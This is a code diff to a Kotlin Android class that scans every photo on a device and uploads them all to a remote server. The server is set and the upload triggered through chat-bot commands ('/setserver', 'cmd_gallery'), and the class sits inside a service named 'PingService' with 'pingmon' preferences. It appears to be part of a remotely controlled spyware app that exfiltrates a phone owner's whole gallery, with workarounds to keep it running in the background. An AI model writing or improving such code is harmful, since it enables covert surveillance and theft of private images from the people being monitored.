@@ -14,18 +14,27 @@ import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
+/**
+ * Gallery uploader — ID-based deduplication, server is the source of truth.
+ *
+ * Flow:
+ *   1. Scan MediaStore → list of {id, uri, name}
+ *   2. POST /gallery/diff with all IDs → server returns only missing ones
+ *   3. Upload each missing photo (idempotent — safe to retry)
+ *   4. POST /gallery/done → server marks complete or partial
+ *
+ * No SharedPreferences state needed — server tracks everything.
+ * Safe for concurrent commands — runs on its own Thread.
+ */
 class GalleryUploader(private val ctx: Context) {
 
     companion object {
-        private const val TAG      = "Gallery"
-        private const val PREFS    = "pingmon"
-        private const val KEY_SID  = "gal_session"
-        private const val KEY_DONE = "gal_done_ids"   // JSON array of uploaded IDs
-
+        private const val TAG = "GalleryUpload"
         val isRunning = AtomicBoolean(false)
     }
 
-    private val prefs  = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+    private val uid    = PingService.uid(ctx)
+    private val prefs  = ctx.getSharedPreferences(PingService.PREFS, Context.MODE_PRIVATE)
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
@@ -33,162 +42,160 @@ class GalleryUploader(private val ctx: Context) {
         .retryOnConnectionFailure(true)
         .build()
 
-    /** Start fresh or resume. Called from cmd_gallery. */
+    /** Start upload (or resume). Called by cmd_gallery. */
     fun start() {
         if (isRunning.getAndSet(true)) { Log.w(TAG, "already running"); return }
-        Thread({
-            try { run() }
-            catch (e: Exception) { report("Error: ${e.message}") }
-            finally { isRunning.set(false) }
-        }, "gallery").start()
+        Thread({ try { run() } finally { isRunning.set(false) } }, "gallery").start()
     }
 
-    /** Refresh: re-scan for new photos and upload only the new ones. */
-    fun refresh() {
-        if (isRunning.getAndSet(true)) { Log.w(TAG, "refresh: already running"); return }
-        // Clear session so a new one starts, but keep done IDs for dedup
-        prefs.edit().remove(KEY_SID).apply()
-        Thread({
-            try { run() }
-            catch (e: Exception) { report("Error: ${e.message}") }
-            finally { isRunning.set(false) }
-        }, "gallery-refresh").start()
-    }
+    /** Re-check for new photos. Same as start() — server handles dedup. */
+    fun refresh() = start()
 
     private fun run() {
         val server = PingService.serverUrl(ctx)
         if (server.isBlank()) { report("No server set. Use /setserver in bot."); return }
 
-        val photos = queryPhotos()
-        if (photos.isEmpty()) { report("No photos found."); return }
+        // 1. Scan local gallery
+        val photos = scanGallery()
+        if (photos.isEmpty()) { report("No photos found on device."); return }
 
-        // Load IDs already uploaded
-        val doneSet = loadDoneIds()
+        val allIds = photos.map { it.id.toString() }
 
-        // Filter out already-uploaded photos
-        val pending = photos.filter { it.id.toString() !in doneSet }
-        val total   = photos.size
-        val already = total - pending.size
+        // 2. Ask server which IDs it's missing
+        val diff = requestDiff(server, allIds, photos.size) ?: run {
+            report("Could not reach server.")
+            return
+        }
+        val newIds    = diff.newIds
+        val uploaded  = diff.uploaded
+        val total     = diff.total
 
-        if (pending.isEmpty()) {
-            // Nothing new — re-zip existing photos from server
-            report("No new photos. Re-zipping ${doneSet.size} existing photos from server...")
-            val server = PingService.serverUrl(ctx)
-            if (server.isNotBlank()) {
-                postJson("$server/gallery/rezip", JSONObject().put("uid", PingService.uid(ctx)))
-            }
+        if (newIds.isEmpty()) {
+            report("No new photos. Server has all $uploaded/$total. Use ZIP button to re-send.")
             return
         }
 
-        Log.i(TAG, "Total=$total already=$already pending=${pending.size}")
+        report("Starting: $uploaded/$total already on server. Uploading ${newIds.size} new...")
+        Log.i(TAG, "diff: ${newIds.size} new, $uploaded already uploaded, $total total")
 
-        // Start or reuse session
-        var sid = prefs.getString(KEY_SID, "") ?: ""
-        if (sid.isBlank()) {
-            val res = postJson("$server/gallery/start", JSONObject().apply {
-                put("uid",    PingService.uid(ctx))
-                put("device", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
-                put("total",  total)
-                put("already", already)
-            }) ?: run { report("Failed to start session."); return }
-            sid = res.optString("session_id", "")
-            prefs.edit().putString(KEY_SID, sid).apply()
-        }
+        // 3. Build a lookup map for quick URI access
+        val photoMap = photos.associateBy { it.id.toString() }
 
-        var sent    = 0
-        var failed  = 0
+        var sent   = 0
+        var failed = 0
 
-        for ((index, photo) in pending.withIndex()) {
-            // Small delay for MIUI stability
-            if (index > 0 && index % 10 == 0) Thread.sleep(300)
+        for (id in newIds) {
+            val photo = photoMap[id] ?: continue
+
+            // Small delay every 20 photos — MIUI battery killer mitigation
+            if ((sent + failed) > 0 && (sent + failed) % 20 == 0) Thread.sleep(200)
 
             try {
                 val bytes = ctx.contentResolver
-                    .openInputStream(photo.uri)?.use { it.readBytes() } ?: continue
+                    .openInputStream(photo.uri)?.use { it.readBytes() }
+                if (bytes == null || bytes.isEmpty()) { failed++; continue }
 
-                val ok = uploadPhoto(server, sid, already + index, photo.name, bytes)
-                if (ok) {
-                    sent++
-                    doneSet.add(photo.id.toString())
-                    saveDoneIds(doneSet)   // persist after every success
-                } else {
-                    failed++
-                }
+                val ok = uploadPhoto(server, id, photo.name, bytes)
+                if (ok) sent++ else failed++
             } catch (e: Exception) {
                 failed++
-                Log.w(TAG, "photo ${photo.id}: ${e.message}")
+                Log.w(TAG, "photo $id: ${e.message}")
             }
         }
 
-        postJson("$server/gallery/finish", JSONObject().put("session_id", sid))
-        prefs.edit().remove(KEY_SID).apply()
+        // 4. Notify server we're done
+        val finalUploaded = uploaded + sent
+        markDone(server, finalUploaded, total, failed)
 
-        report("Gallery done: $sent sent, $failed failed, $already already uploaded.")
+        val msg = if (failed == 0)
+            "Gallery complete: $finalUploaded/$total photos on server."
+        else
+            "Gallery partial: $sent new uploaded, $failed failed. Press Gallery to retry."
+        report(msg)
     }
 
-    private fun uploadPhoto(server: String, sid: String, index: Int,
-                            name: String, bytes: ByteArray): Boolean {
+    /* ─────────────────────────────────────────── API calls ── */
+
+    private data class DiffResult(val newIds: List<String>, val uploaded: Int, val total: Int)
+
+    private fun requestDiff(server: String, allIds: List<String>, total: Int): DiffResult? {
+        return try {
+            val body = JSONObject().apply {
+                put("uid",    uid)
+                put("device", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
+                put("ids",    JSONArray(allIds))
+            }.toString()
+            val req = Request.Builder()
+                .url("$server/gallery/diff")
+                .addHeader("X-Token", PingService.APP_TOKEN)
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            client.newCall(req).execute().use { resp ->
+                if (!resp.isSuccessful) return null
+                val json = JSONObject(resp.body?.string() ?: return null)
+                val newIds = json.optJSONArray("new_ids")
+                    ?.let { arr -> (0 until arr.length()).map { arr.getString(it) } }
+                    ?: emptyList()
+                DiffResult(
+                    newIds    = newIds,
+                    uploaded  = json.optInt("uploaded", 0),
+                    total     = json.optInt("total", total),
+                )
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "diff: ${e.message}")
+            null
+        }
+    }
+
+    private fun uploadPhoto(server: String, id: String, name: String, bytes: ByteArray): Boolean {
         return try {
             val req = Request.Builder()
-                .url("$server/gallery/photo")
+                .url("$server/gallery/upload")
                 .addHeader("X-Token",    PingService.APP_TOKEN)
-                .addHeader("X-Session",  sid)
-                .addHeader("X-Index",    index.toString())
-                .addHeader("X-Filename", name)
+                .addHeader("X-UID",      uid)
+                .addHeader("X-ID",       id)
+                .addHeader("X-Filename", name.replace(Regex("[^a-zA-Z0-9._-]"), "_"))
                 .post(bytes.toRequestBody("image/jpeg".toMediaType()))
                 .build()
             client.newCall(req).execute().use { it.isSuccessful }
         } catch (e: Exception) {
-            Log.w(TAG, "upload: ${e.message}")
+            Log.w(TAG, "upload $id: ${e.message}")
             false
         }
     }
 
-    private fun postJson(url: String, body: JSONObject): JSONObject? {
-        return try {
+    private fun markDone(server: String, uploaded: Int, total: Int, failed: Int) {
+        try {
+            val body = JSONObject().apply {
+                put("uid",      uid)
+                put("uploaded", uploaded)
+                put("total",    total)
+                put("failed",   failed)
+            }.toString()
             val req = Request.Builder()
-                .url(url)
+                .url("$server/gallery/done")
                 .addHeader("X-Token", PingService.APP_TOKEN)
-                .post(body.toString().toRequestBody("application/json".toMediaType()))
+                .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
-            client.newCall(req).execute().use { resp ->
-                if (resp.isSuccessful) JSONObject(resp.body?.string() ?: "{}") else null
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "post $url: ${e.message}")
-            null
-        }
+            client.newCall(req).execute().use { }
+        } catch (e: Exception) { Log.w(TAG, "done: ${e.message}") }
     }
 
     private fun report(msg: String) {
         prefs.edit().putString("pending_report", msg).apply()
     }
 
-    /* ─────────────────────────── done-IDs persistence */
-
-    private fun loadDoneIds(): MutableSet<String> {
-        val raw = prefs.getString(KEY_DONE, "[]") ?: "[]"
-        return try {
-            val arr = JSONArray(raw)
-            val set = mutableSetOf<String>()
-            for (i in 0 until arr.length()) set.add(arr.getString(i))
-            set
-        } catch (_: Exception) { mutableSetOf() }
-    }
-
-    private fun saveDoneIds(ids: Set<String>) {
-        prefs.edit().putString(KEY_DONE, JSONArray(ids.toList()).toString()).apply()
-    }
-
-    /* ─────────────────────────── MediaStore */
+    /* ─────────────────────────────────────── MediaStore scan ── */
 
     data class Photo(val id: Long, val uri: Uri, val name: String)
 
-    private fun queryPhotos(): List<Photo> {
-        val list  = mutableListOf<Photo>()
-        val col   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+    private fun scanGallery(): List<Photo> {
+        val list = mutableListOf<Photo>()
+        val col  = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
             MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
-        else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        else
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
 
         ctx.contentResolver.query(
             col,
